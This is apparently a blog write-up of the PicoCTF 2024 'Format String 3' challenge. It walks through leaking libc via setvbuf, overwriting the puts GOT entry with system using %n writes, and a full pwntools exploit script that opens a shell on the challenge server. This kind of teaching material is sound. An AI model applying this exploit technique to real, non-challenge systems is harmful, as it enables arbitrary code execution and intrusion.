---
title: PicoCTF 2024 - Format String 3
description: Exploiting a format string vulnerability in a given binary, by analyzing stack layout and gaining arbitrary code execution, by careful leveraging of %n formats. These writes enable a ret2libc attack, where the Global Offset Table (GOT) entry for puts is redirected to system, ultimately allowing the execution of a shell command.
date: 1721777579
tags:
  - Writeup
  - Binary Exploitation
slug: PicoCTF 2024 - Format String 3
published: true
---

## Description

This program doesn't contain a win function. Download the binary [here](https://artifacts.picoctf.net/c_rhea/3/format-string-3). Download the source [here](https://artifacts.picoctf.net/c_rhea/3/format-string-3.c). Download libc [here](https://artifacts.picoctf.net/c_rhea/3/libc.so.6), download the interpreter [here](https://artifacts.picoctf.net/c_rhea/3/ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.

## Behavior

```
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x70a3c9d2f3f0
%x%x%x Hello!
c9e8d963fbad208bbe4d5600 Hello!
/bin/sh
```

## Vulnerable Code

```c
fgets(buf, 1024, stdin);
printf(buf);

puts(normal_string); // normal_string is /bin/sh
```

On this code I am supposed to use printf %n vulnerability to somehow execute system() instead of puts.

```
  4012db:       48 89 c7                mov    %rax,%rdi
  4012de:       b8 00 00 00 00          mov    $0x0,%eax
  4012e3:       e8 b8 fd ff ff          call   4010a0
  4012e8:       48 8b 05 59 2d 00 00    mov    0x2d59(%rip),%rax
  4012ef:       48 89 c7                mov    %rax,%rdi
  4012f2:       e8 89 fd ff ff          call   401080
  4012f7:       b8 00 00 00 00          mov    $0x0,%eax
  4012fc:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
  401300:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
```

## Arbitrary Writes through %n

%n works by writing amount of written charachters to the pointer that is in that memory address. This is unlike all other format specifiers, since they can only read data.

When you write to an argument with printf, you actually just write to stack. And you can write to previous arguments that are in stack, if you get the correct offset.

Let's start by reading the stack with a regular %x format string exploit.

```
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7af355ecb3f0
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
56029963 fbad208b f0afd300 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 25207825 20782520 78252078 25207825 20782520 78252078 25207825
20782520
/bin/sh
```

The repeating 20782520 seems to be the %x strings, which means that we can find the offset, put a pointer into the first argument, and overwrite it by %n.

We are unable to directly execute shellcode using this arbitrary write, due to NX protections. In modern systems it is impossible to have a data segment be both writable and executable, this is to prevent this type of attack. What is done instead to elevate from arbitrary write is called ret2libc, where you can overwrite the (writable) global offset table, and make other functions run different libc functions than intended.

In this instance, we need to overwrite the GOT entry of puts, into system, since at the end of the script it runs puts("/bin/sh")
Finding the address of system()

ASLR protections will complicate this a bit, since we can't simply find the static adress of system() in lib.so.6 and place it into the GOT. Luckily there is no PIC on the binary itself, which will make it easier to find a pointer to the offset table.

Luckily we can easily find the ASLR offset through the second line that gives us the address to setvbuf. Then from that we just calculate the ASLR offset to libc, and add the system() offset to that. This could be manually done, but pwntools gives us a really nice interface to do this.

```
static_setvbuf = libc.sym.setvbuf # Get setvbuf from lib.so.6 ELF
aslred_setvbuf = r.recv(12) # Get aslred setvbuf from ELF output
aslred_setvbuf = int(aslred_setvbuf, 16) # Convert it to integer
libc.address = aslred_setvbuf - static_setvbuf # Set libc offset
```

## Overwriting got.plt

First let's try making an arbitrary write to an unavailable address, and see if we can sigsegv.

```
r.sendline(bytes.fromhex("12345678") + b"aaaaaaaaaa %38$n")
```

Here I get sigsegv -11, which means I'm trying to access an invalid memory adress. This is as expected and means I am on the correct track.

A big problem with writing with %n like this is that I would need to write 2^48 charachters to the buffer, to overwrite a single 6-byte address. This is unfeasible, and would mean I would have to send 281 terabytes losslessly over network.

Instead I could send it over sequentially overwrite byte by byte. First overwrite pointer to 0x404018 then 0x404019 until 0x40401f. This is very fiddly, and instead of doing it manually you can use pwntools built in function to generate these payloads fmtstr_payload()

```
r.sendline(fmtstr_payload(38, {elf.got['puts']: libc.sym['system']}))
```

38 is the offset that we calculated earlier to reach the first argument, elf.got['puts'] is the pointer that we want to overwrite, and libc.sym['system'] is what we overwrite it with. Note that the libc object is the one that we set the offset on earlier.

## Final Script

I added some comments to the script so that it's easier to understand.

```
from pwn import *

context(arch="amd64", os="linux")
elf = ELF("format-string-3") # Context from local binary, so pwntools knows all offsets
libc = elf.libc


# r = gdb.debug("./format-string-3", gdbscript='continue')
# r = process("./format-string-3")
r = remote("pico instance here")

r.recvline() # Skip howdy gamers
r.recvuntil("x") # Skip output until pointer after 0x

static_setvbuf = libc.sym.setvbuf # Get setvbuf from lib.so.6 ELF
aslred_setvbuf = r.recv(12) # Get aslred setvbuf from ELF output
aslred_setvbuf = int(aslred_setvbuf, 16) # Convert it to integer
libc.address = aslred_setvbuf - static_setvbuf # Set libc offset

r.sendline(fmtstr_payload(38, {elf.got['puts']: libc.sym['system']})) # Send the payload
r.interactive()
```
